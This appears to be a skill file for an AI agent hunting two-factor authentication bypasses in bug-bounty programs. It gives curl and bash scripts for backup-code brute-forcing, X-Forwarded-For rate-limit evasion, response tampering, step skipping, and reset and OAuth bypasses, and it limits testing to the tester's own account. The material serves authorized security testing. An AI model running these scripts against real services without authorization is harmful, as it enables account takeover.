---
name: hunt-2fa-bypass
description: "Hunt 2FA/MFA bypass — response manipulation, backup code brute-force, rate limit bypass, parallel session attack, direct API access skipping 2FA, account recovery disabling 2FA, OAuth bypassing 2FA gate. Use when a target implements two-factor authentication and you need to test its enforcement."
---

## Decision tree

| You see | Do once | Proves |
|---|---|---|
| 2FA verification endpoint returns JSON | Intercept response, change `success:false` → `success:true` | Authenticated session granted without valid OTP |
| Backup codes (8-digit numeric) | Submit 10 guesses rapidly — if no lockout, try 100 | Valid session from guessed backup code |
| Rate limit on OTP entry | Repeat from different IP, or add `X-Forwarded-For` header | Bypass allows unlimited OTP attempts |
| Login flow has separate password + 2FA steps | Complete password step in session A, skip 2FA, hit authenticated endpoint | API responds with user data without 2FA completion |
| OAuth/social login available alongside 2FA | Login via OAuth for account that has 2FA enabled | OAuth session bypasses 2FA entirely |
| Account recovery / password reset | Reset password, check if 2FA is disabled after reset | Full account access without 2FA |

## Response manipulation

Intercept the 2FA verification response:

```bash
# Original response (failure)
{"success":false,"error":"Invalid code"}

# Tamper to:
{"success":true}
# or change HTTP status from 401/403 to 200
```

Some SPAs check `response.status` or `response.data.success` client-side and redirect to dashboard. If the server doesn't validate server-side on subsequent requests, you're in.

Also try: submitting empty OTP, `000000`, `null`, `[]`, or the string `"true"`.

## Backup code brute-force

```bash
# If backup codes are 6-8 digit numeric with no rate limit:
for code in $(seq 100000 100100); do
  RESP=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/2fa/verify" \
    -d "{\"code\":\"$code\",\"type\":\"backup\"}" -H "Authorization: Bearer $TOKEN")
  [ "$RESP" != "401" ] && [ "$RESP" != "429" ] && echo "HIT: $code -> $RESP" && break
done
```

Stop after 100 attempts. If no lockout after 20, that's the finding (weak rate limit), not the brute-forced code.

## Rate limit bypass

```bash
# X-Forwarded-For rotation
for i in $(seq 1 20); do
  curl -s -X POST "$TARGET/api/2fa/verify" \
    -d '{"code":"123456"}' \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -H "Authorization: Bearer $TOKEN"
done

# Also try: X-Real-IP, X-Originating-IP, True-Client-IP, X-Client-IP
# Also try: adding a space/null byte to the code field to reset rate limit counter
```

## Parallel session (step skip)

```bash
# Session A: complete password authentication
TOKEN_A=$(curl -s -X POST "$TARGET/api/auth/login" -d '{"email":"test@test.com","password":"pass"}' | jq -r '.token')

# Without completing 2FA on token A, try hitting authenticated endpoints directly:
curl -s "$TARGET/api/me" -H "Authorization: Bearer $TOKEN_A"
curl -s "$TARGET/api/dashboard" -H "Authorization: Bearer $TOKEN_A"
curl -s "$TARGET/api/settings" -H "Authorization: Bearer $TOKEN_A"
```

The 2FA step may only gate the UI redirect, not the API authorization middleware.

## Direct API access

Some apps enforce 2FA only on the web login flow. Try:
- Mobile API endpoints (`/api/v1/mobile/login`) — may skip 2FA
- Older API versions (`/api/v1/` vs `/api/v2/`) — 2FA added only to newer
- GraphQL mutations — `login(email, password)` may return a full session
- Token refresh endpoint — refresh token from pre-2FA may yield post-2FA access

## Account recovery bypass

```bash
# Trigger password reset for 2FA-enabled account
curl -X POST "$TARGET/api/auth/forgot-password" -d '{"email":"victim@test.com"}'
# Complete reset via email link
# Login with new password — is 2FA still enabled?
curl -X POST "$TARGET/api/auth/login" -d '{"email":"victim@test.com","password":"newpass"}'
```

If 2FA is silently disabled on password reset, that's the finding.

## OAuth bypass

```bash
# If Google/GitHub OAuth is available:
# 1. Enable 2FA on account with email test@test.com
# 2. Login via OAuth with same email
# 3. Check if 2FA is required — often OAuth trusts the provider and skips it
```

## Validation

- **Prove authenticated access**: after the bypass, show you can read user data, change settings, or perform an action that requires a valid session.
- Response manipulation: the tampered response must lead to a WORKING session, not just a client-side redirect that hits a 401 on the next API call.
- Rate limit: show that N attempts succeeded without lockout where documentation says M < N is the limit.
- Use your OWN test account. Never target another user's 2FA.

## Chains

- 2FA bypass → `hunt-ato` (full account takeover if password is known/leaked)
- 2FA bypass + password reset → complete ATO chain
- Backup code leak via `hunt-source-leak` → 2FA bypass without brute-force

## Before you report — dedup gate

```bash
python3 engine/dedup.py check --program <program> --class 2fa-bypass --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop. Draft only — do not submit.

Cross-refs: `hunt-ato`, `hunt-mfa-bypass`, `hunt-auth-bypass`, `hunt-race`, `hunt-source-leak`.
